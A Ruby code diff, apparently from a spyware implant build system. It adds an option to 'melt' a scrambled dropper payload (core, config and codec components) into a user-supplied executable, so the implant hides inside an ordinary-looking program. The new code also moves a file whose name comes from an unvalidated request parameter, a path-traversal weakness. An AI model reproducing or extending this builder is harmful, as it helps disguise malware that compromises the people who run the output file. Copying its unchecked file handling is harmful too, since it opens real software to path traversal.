@@ -55,6 +55,14 @@ class BuildWindows < Build
 
     manifest = (params['admin'] == true) ? '1' : '0'
 
+    executable = path('default')
+
+    # use the user-provided file to melt with
+    if params['input']
+      FileUtils.mv File.join(Dir.tmpdir, params['input']), path('input')
+      executable = path('input')
+    end
+
     CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                         path(@scrambled[:core64])+' '+
                                         path(@scrambled[:config])+' '+
@@ -63,7 +71,7 @@ class BuildWindows < Build
                                         path(@scrambled[:codec])+' '+
                                         @scrambled[:dir]+' '+
                                         manifest +' '+
-                                        path('default')+' '+
+                                        executable + ' ' +
                                         path('output')
 
 
